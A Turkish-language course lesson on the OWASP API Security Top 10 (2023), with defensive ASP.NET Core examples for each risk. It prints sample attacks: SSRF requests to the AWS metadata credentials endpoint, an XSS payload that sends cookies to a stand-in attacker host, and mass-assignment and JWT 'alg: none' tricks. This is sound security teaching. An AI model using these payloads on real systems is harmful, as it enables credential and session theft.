# Gün 109 — API Security 4: OWASP API Security Top 10 (2023)

---

## OWASP Nedir?

**OWASP (Open Worldwide Application Security Project)** — kâr amacı gütmeyen bir güvenlik kuruluşu. Endüstri standardı dokümanlar yayınlıyor.

En ünlüleri:
- **OWASP Top 10:** Web uygulamalarının en yaygın güvenlik açıkları
- **OWASP API Top 10:** API'lara özel güvenlik açıkları (2019, 2023'te güncellendi)

Bugün API Top 10 (2023) listesini ele alacağız. Her madde gerçek bir saldırı türü — neden tehlikeli olduğunu, nasıl önleneceğini anlatacağız.

**Neden API'lara özel liste var?** Web (form-based) ve API'lar farklı saldırı yüzeyleri sunuyor. API'lar:
- Direkt iş mantığına erişim
- Çoğunlukla JSON, yapılandırılmış veri
- Birden fazla client (web, mobil, 3. parti)
- Daha az UI doğrulaması (frontend güvenliğine güvenemezsin)

---

## API1:2023 — Broken Object Level Authorization (BOLA)

**En yaygın ve en tehlikeli API açığı.**

### Saldırı

Kullanıcı kendi siparişine erişebiliyor: `GET /api/siparisler/42`.

Server check yapıyor: "Kullanıcı giriş yapmış mı?" → evet → siparişi döndürüyor.

Ama kontrol etmediği şey: **bu sipariş bu kullanıcıya ait mi?**

Saldırgan id'yi değiştiriyor: `GET /api/siparisler/43`, `GET /api/siparisler/44`... Başka kullanıcıların siparişlerini görüyor.

### Neden Yaygın?

Authentication (kullanıcı giriş yapmış mı?) basit, framework otomatik yapıyor. Ama **object-level authorization** (bu kullanıcı bu KAYDA erişebilir mi?) her endpoint'te elle yazılması gereken bir kontrol.

Geliştirici "auth middleware koydum, herkes giriş yapmış" diye düşünüyor. Ama auth middleware sadece "kim olduğunu" söylüyor — "ne erişebileceğine" karar vermiyor.

### Koruma

Her endpoint'te kaynak sahipliği kontrolü:

```csharp
[HttpGet("siparisler/{id}")]
public async Task<IActionResult> Get(int id)
{
    var siparis = await _context.Siparisler.FindAsync(id);
    if (siparis is null) return NotFound();

    // ÖNEMLI — sahiplik kontrolü:
    var currentUserId = User.GetUserId();
    if (siparis.UserId != currentUserId)
        return Forbid();
    // bunu yazmasaydık → başka kullanıcının siparişi de döndürürdü (BOLA)

    return Ok(siparis);
}
```

**Daha temiz yaklaşım — Global Query Filter:** Gün 95 ve 98'de gördüğümüz pattern. EF Core her sorguya otomatik `WHERE UserId = currentUserId` ekler. Geliştirici unutamaz.

```csharp
modelBuilder.Entity<Siparis>()
    .HasQueryFilter(s => s.UserId == _currentUser.UserId);
// ne yapar → her sorguda otomatik kullanıcı bazlı filtre
// FindAsync(43) → eğer 43 başka kullanıcınınsa → null döner (sanki yok)
```

---

## API2:2023 — Broken Authentication

Authentication mekanizmasının kendisinde açıklar.

### Yaygın Hatalar

**Zayıf şifre politikası:** "123456" kabul ediliyor → brute-force kolay.

**Brute-force koruması yok:** Login endpoint'inde rate limiting yok → saldırgan dakikada binlerce deneme yapabilir.

**JWT signature kontrolü zayıf:**
```csharp
ValidateIssuerSigningKey = false  // ❌ imzayı kontrol etme!
```
İmzayı kontrol etmezsen → saldırgan kendi JWT'sini üretip "admin" claim'iyle gönderebilir.

**`alg: none` saldırısı:**
JWT'nin header'ı `{"alg": "none"}` olabilir — bazı kütüphaneler bunu kabul ediyor, imza kontrolü atlanıyor. Modern .NET kütüphaneleri bunu reddediyor ama eski sistemlerde sorun var.

**Refresh token tek kullanımlık değil:**
Refresh token bir kez kullanılınca yenisi üretilmiyor — çalınırsa süresiz kullanılabilir.

### Koruma

- Şifre minimum 12 karakter, complexity zorlama
- Login endpoint'ine rate limiting (5 deneme/dakika/IP — Gün 89)
- JWT için ValidateIssuerSigningKey + ValidateLifetime mutlaka true
- Refresh token rotation (Gün 106)
- MFA (multi-factor authentication) hassas işlemler için

---

## API3:2023 — Broken Object Property Level Authorization

BOLA'nın property bazlı versiyonu. Kullanıcı kayda erişmeye yetkili ama tüm property'lerine erişmeye yetkili değil.

### Saldırı

`PUT /api/profilim` endpoint'i. Kullanıcı kendi profilini güncelliyor. Server tüm property'leri kabul ediyor:

```json
PUT /api/profilim
{
  "ad": "Berkan",
  "email": "yeni@mail.com",
  "rol": "Admin"        // ← bunu göndermesi gerekmiyordu
}
```

Geliştirici `_context.Users.Update(dto)` yazdı. `dto.Rol = "Admin"` → DB'de güncellendi. Saldırgan admin oldu.

Buna **mass assignment** denir. Tüm DTO property'lerini direkt entity'ye kopyalama tehlikesi.

### Diğer Yön: Aşırı Bilgi Sızıntısı

Bazen property'leri aşırı paylaşıyorsun:

```json
GET /api/users/42
{
  "id": 42,
  "name": "Berkan",
  "email": "berkan@mail.com",
  "passwordHash": "AQAAAAIA...",  // ← bunu neden döndürüyorsun
  "internalNotes": "VIP customer", // ← kullanıcı görmesin
  "creditCardLast4": "1234"        // ← public görünmesin
}
```

Backend tüm entity'yi serialize ediyor → hassas alanlar dışarı sızıyor.

### Koruma

**Input için:** DTO'larda sadece kullanıcının değiştirebileceği alanlar:
```csharp
public class UpdateProfileDto
{
    public string Ad { get; set; }
    public string Email { get; set; }
    // Rol YOK — kullanıcı kendi rolünü değiştiremez
}
```

**Output için:** Response DTO ile sadece görünmesi gereken alanları döndür:
```csharp
public class UserResponseDto
{
    public int Id { get; set; }
    public string Name { get; set; }
    public string Email { get; set; }
    // PasswordHash, InternalNotes YOK
}
```

Entity'yi asla direkt dönüş yapma — her zaman DTO ile filtrele.

---

## API4:2023 — Unrestricted Resource Consumption

Saldırgan API'nı yorarak servis dışı bırakır (DoS) veya cloud faturanı şişirir.

### Saldırı Örnekleri

**Pagination olmadan büyük liste:**
`GET /api/kitaplar` → 1 milyon kayıt döner → server şişer, network tıkanır.

**Dosya yükleme limiti yok:**
Saldırgan 10 GB dosya upload eder → disk dolar.

**Resim işleme:** Server kullanıcının yüklediği resmi thumbnail yapıyor. Saldırgan 50000x50000 piksel "zip bomb" görsel gönderiyor → server RAM şişer, çöker.

**Pahalı sorgular:** GraphQL veya complex filter ile `WHERE` koşulu hesaplanması saatler süren sorgu üretmek.

**Email/SMS gönderme:** "Şifremi unuttum" endpoint'ini 10000 kez tetiklemek → her birinde email gönderiliyor → email servisi faturası şişiyor (her email 0.001$ × 10000 = 10$ saldırı başına).

### Koruma

- **Rate limiting** (Gün 89): istek sayısı sınırı
- **Pagination zorunlu:** her liste endpoint'i maks 100 kayıt döner
- **Request size limit:** body max 10 MB
- **Timeout:** sorgu max 30 saniye
- **Quota:** kullanıcı başına günlük limit (özellikle email/SMS gibi maliyetli işlemler)

```csharp
// Program.cs:
builder.WebHost.ConfigureKestrel(opt =>
{
    opt.Limits.MaxRequestBodySize = 10 * 1024 * 1024;  // 10 MB
    opt.Limits.KeepAliveTimeout = TimeSpan.FromSeconds(30);
});

// Endpoint'te pagination zorunlu:
public async Task<IActionResult> GetKitaplar(int sayfa = 1, int boyut = 20)
{
    if (boyut > 100) boyut = 100;  // hard cap
    var sonuc = await _repo.GetPaginatedAsync(sayfa, boyut);
    return Ok(sonuc);
}
```

---

## API5:2023 — Broken Function Level Authorization

Endpoint seviyesi yetkilendirme açığı. Bazı endpoint'ler admin'e özel olmalı ama kontrol eksik.

### Saldırı

Normal kullanıcı `/api/users` listesini çekiyor → OK, kendi profilini görüyor. Ama admin endpoint'ini deniyor: `DELETE /api/users/42` → server siliyor!

Geliştirici endpoint'in admin'e özel olduğunu unutmuş. Auth middleware "giriş yapmış mı?" kontrol ediyor → yapmış → endpoint'i çalıştırıyor.

### Koruma

Her endpoint'te authorization seviyesi açıkça belirt:

```csharp
[Authorize(Roles = "Admin")]   // ← unutursan endpoint herkese açık
[HttpDelete("users/{id}")]
public async Task<IActionResult> DeleteUser(int id) { ... }

// Veya policy-based:
[Authorize(Policy = "RequireAdminRole")]
[HttpPost("users/{id}/ban")]
public async Task<IActionResult> Ban(int id) { ... }
```

**Daha iyisi: Deny by default.** Tüm controller'lara global `[Authorize]` koy. Public endpoint'ler için explicit `[AllowAnonymous]` ekle. Unutursan endpoint herkese kapalı olur (güvenli yanılgı).

```csharp
// Program.cs:
builder.Services.AddAuthorization(opt =>
{
    opt.FallbackPolicy = new AuthorizationPolicyBuilder()
        .RequireAuthenticatedUser()
        .Build();
    // ne yapar → [Authorize] olmayan endpoint'ler de auth ister
    // bunu yazmasaydık → [Authorize] unutulan endpoint herkese açık
});
```

---

## API6:2023 — Unrestricted Access to Sensitive Business Flows

İş süreçlerinin kötüye kullanımı. Auth ve rate limiting var ama iş mantığının kendisi sömürülebiliyor.

### Saldırı Örnekleri

**Bilet kapma botları:** Konser bileti satışı açılıyor. Saldırganın botu 1000 hesapla aynı anda 1000 bilet alıyor. İnsanlar bilet alamıyor, botlar karaborsada satıyor.

**Yorum spam:** "Yorum yaz" endpoint'i rate limiting'i var (dakikada 5 yorum). Saldırgan 100 hesapla aynı reklam yorumunu yapıyor.

**İndirim kuponu istismarı:** "İlk siparişe %50 indirim" → saldırgan 1000 fake hesapla 1000 siparişe %50 alıyor.

### Koruma

- **Bot detection:** CAPTCHA, davranışsal analiz
- **Account verification:** Email + telefon doğrulama, KYC
- **Trust score:** Yeni hesaplar daha fazla doğrulama
- **Business logic limits:** "Bir kullanıcı 24 saatte max 2 bilet alabilir"
- **Device fingerprinting:** Aynı cihazdan birden fazla hesap tespiti

---

## API7:2023 — Server Side Request Forgery (SSRF)

Saldırgan API'nın internal kaynaklara istek atmasını sağlıyor.

### Saldırı

Senin API'n URL'den resim indirip thumbnail üretiyor:
```
POST /api/profil-resim {"url": "https://example.com/photo.jpg"}
```

Saldırgan internal URL veriyor:
```
POST /api/profil-resim {"url": "http://localhost:8500/admin/secret"}
```

Veya cloud metadata endpoint'i:
```
POST /api/profil-resim {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
```

AWS metadata endpoint cloud credential'ları döner. Sunucu içeriden bu URL'ye erişebilir ama saldırgan dışarıdan erişemez. Sen aracı oluyorsun → AWS credential'ları saldırgana gidiyor.

### Koruma

- **URL allowlist:** Sadece belirli domain'lere izin ver
- **Internal IP'leri yasakla:** 10.x, 172.16-31.x, 192.168.x, 169.254.x, 127.x
- **Schema kısıtla:** Sadece https://, file:// veya gopher:// gibi şemaları reddet
- **Redirect takibi yapma:** 301/302 yanıtları takip etme (saldırgan ilk URL'i güvenli, redirect'i internal yapabilir)

```csharp
public async Task<IActionResult> FetchUrl(string url)
{
    var uri = new Uri(url);

    if (uri.Scheme != "https")
        return BadRequest("Sadece https'e izin var");

    if (IsInternalIp(uri.Host))
        return BadRequest("Internal IP'lere erişim yasak");

    if (!_allowedDomains.Contains(uri.Host))
        return BadRequest("Bu domain'e izin yok");

    // HttpClient'ı redirect takibi kapalı kullan:
    using var handler = new HttpClientHandler { AllowAutoRedirect = false };
    using var client = new HttpClient(handler);
    var response = await client.GetAsync(uri);
    // ...
}
```

---

## API8:2023 — Security Misconfiguration

Yanlış yapılandırılmış güvenlik ayarları. Geniş kategori, çok yaygın.

### Yaygın Hatalar

**Production'da development settings:**
- `Debug = true` → stack trace kullanıcıya gösteriliyor
- Detailed errors açık → DB schema bilgisi sızabilir
- Development URL'leri (`/swagger`) production'da açık

**Eksik güvenlik header'ları:** (Gün 108) CSP, HSTS, X-Frame-Options yoksa

**Verbose error messages:**
```
Exception: Cannot connect to SQL Server at db-prod.internal.com:1433
```
DB sunucunun hostname'i sızdı.

**Default credentials:** Database, admin panel default şifrelerle çalışıyor.

**Eski paketler:** Bilinen güvenlik açıklarına sahip eski library versiyonları.

### Koruma

- **Environment-specific config:** `appsettings.Production.json` ayarları dikkatli
- **Production'da swagger kapalı** (veya auth arkasında)
- **Generic error messages:** Detayları sadece logla, kullanıcıya gösterme
- **Dependency scanning:** Dependabot, Snyk, OWASP Dependency Check
- **Security headers:** Gün 108'deki tüm header'lar
- **CIS Benchmark / Server Hardening:** OS ve servisleri sıkılaştır

---

## API9:2023 — Improper Inventory Management

API'larının dokümantasyonunu, versiyonlarını ve eski endpoint'lerini doğru yönetmiyorsun.

### Saldırı

Eski API versiyonu (v1) production'da hâlâ açık. Yeni versiyon (v2) güvenli ama eski v1'de açık var. Saldırgan v1'i bulup açığı sömürüyor.

Veya: staging API production'a açık → saldırgan staging endpoint'i buluyor (`staging-api.app.com`), düşük güvenlik (Debug=true) ile sömürüyor.

Veya: dokümante edilmemiş "geliştirici endpoint'i" production'da → `GET /api/debug/users` → tüm kullanıcı listesini döner.

### Koruma

- **API versiyon yaşam döngüsü:** v1 deprecated → sunset tarihi → kapatılır (Gün 102)
- **Tüm endpoint'leri envanterlemek:** dokümante et, hangi versiyon, hangi auth seviyesi
- **Eski versiyonları kapat:** kullanılmıyorsa kaldır
- **Staging'i izole et:** staging.app.com production'dan ayrı network'te, auth ile
- **API discovery:** Hangi endpoint'ler var? Otomatik tarama (OpenAPI doc'tan üret)

---

## API10:2023 — Unsafe Consumption of APIs

Senin API'nın güvenliğini düşündük. Ama senin API'n başka API'lara bağlanıyor — 3. parti API'lardan gelen veriye nasıl güveniyorsun?

### Saldırı

Senin API'n bir hava durumu API'sına istek atıyor, sonucu kullanıcıya gösteriyor. Hava durumu API'sı saldırıya uğradı veya zaten kötü niyetli. Sana XSS payload'u içeren bir veri gönderiyor:

```json
{
  "city": "<script>fetch('saldirgan.com?c=' + document.cookie)</script>",
  "temperature": 25
}
```

Senin frontend bunu render ediyor → XSS çalıştı. 3. parti API güvendiğin için validate etmedin.

### Koruma

- **3. parti yanıtlarını da validate et:** Schema validation, content sanitization
- **TLS zorunlu:** http:// 3. partilerle iletişim yasak
- **Allowlist:** Sadece belirli güvenilen API'larla konuş
- **Timeout ve circuit breaker:** 3. parti yavaşlarsa veya çökerse senin sistemini etkilemesin
- **Veriyi düşmanmış gibi davran:** "Bu API'ya güveniyorum" düşüncesi tehlikeli

---

## Genel Prensipler — Tüm Listeyi Özetleyen Yaklaşım

OWASP listesi 10 madde gibi görünüyor ama altında birkaç temel prensip yatıyor:

### 1. Zero Trust

Hiçbir şeye güvenme. Kullanıcı verisine de, 3. parti API'ya da, internal servise de. Her seviyede doğrulama yap.

### 2. Defense in Depth

Tek katman koruma yetmez. Auth + authorization + rate limit + validation + monitoring. Birisi yanılsa diğeri yakalar.

### 3. Principle of Least Privilege

Her şey gerekli olan en az yetkiyle çalışsın. DB user uygulama için sadece SELECT/INSERT/UPDATE/DELETE'e yetkili olsun, DROP'a değil. JWT minimum claim'lerle yayınlansın.

### 4. Secure by Default

Varsayılan ayarlar güvenli olsun. `[Authorize]` unutulursa endpoint kapalı kalsın, açık kalmasın (FallbackPolicy).

### 5. Audit Everything

Olası bir saldırıyı sonradan analiz edebilmek için her şeyi logla. Gün 96'daki audit trail + Gün 101'deki structured logging.

---

## Pratik Checklist — API'nın Güvenli mi?

Her endpoint için:

- [ ] Authentication zorunlu mu? (`[Authorize]` veya FallbackPolicy)
- [ ] Authorization yapılıyor mu? (`Roles` veya `Policy`)
- [ ] Object-level authorization var mı? (Kullanıcı sadece kendi verisine erişebiliyor)
- [ ] Input DTO sadece beklenen alanları içeriyor mu? (Mass assignment yok)
- [ ] Response DTO hassas veri sızdırmıyor mu? (Entity direkt dönmüyor)
- [ ] Pagination var mı? Limit zorlanıyor mu?
- [ ] Rate limiting uygulanıyor mu?
- [ ] Validation eksiksiz mi? (FluentValidation veya DataAnnotations)
- [ ] Hassas veri loglanmıyor mu? (Şifre, token, PII)
- [ ] Error message'lar generic mi? (Internal detay sızmıyor)

Tüm endpoint'lere uygulayacağın bir checklist olsun.

---

## Faz2 ile Karşılaştırma

Faz2 KitabeviMVC'de OWASP listesinin çoğu eksik. Bu normal — eğitim projesi, 500 kullanıcı için yeterli. Production sisteminde aynı eksiklikler felaket.

Özellikle BOLA (API1) — Faz2'de manuel sahiplik kontrolü yapılmamış olabilir. 50K kullanıcıda bu en yaygın açık.

---

## 500 vs 50K Kullanıcı

| Madde | 500 kullanıcı/ay | 50K kullanıcı/ay |
|-------|-------------------|-------------------|
| BOLA koruması | Manuel kontrol yeterli | Global Query Filter zorunlu |
| Authentication | Identity yeterli | + MFA, brute-force koruması |
| Property-level auth | DTO ile başla | DTO + Mapping zorunlu |
| Resource consumption | Pagination yeterli | + Rate limit + body size + timeout |
| Function-level auth | `[Authorize]` yeterli | + FallbackPolicy + audit |
| Misconfiguration | Production env config | + dependency scanning + monitoring |
| API inventory | Tek versiyon | Versiyonlama + sunset disiplini |

---

## Kontrol Soruları

1. BOLA (Broken Object Level Authorization) nedir? Authentication ile farkı ne?
2. Mass assignment saldırısı nasıl çalışıyor? DTO yaklaşımı bunu nasıl önlüyor?
3. Rate limiting olmadan email gönderme endpoint'i nasıl sömürülebilir?
4. SSRF saldırısı nedir? Cloud metadata endpoint'i neden tehlikeli?
5. FallbackPolicy ne yapıyor? Neden "deny by default" güvenli yaklaşım?
6. 3. parti API yanıtlarına güvenmek neden tehlikeli? (API10)
7. Defense in depth ne demek? Bir senaryoda 3 katmanlı koruma örneği ver.
8. Eski API versiyonlarını production'da açık bırakmanın riski nedir?
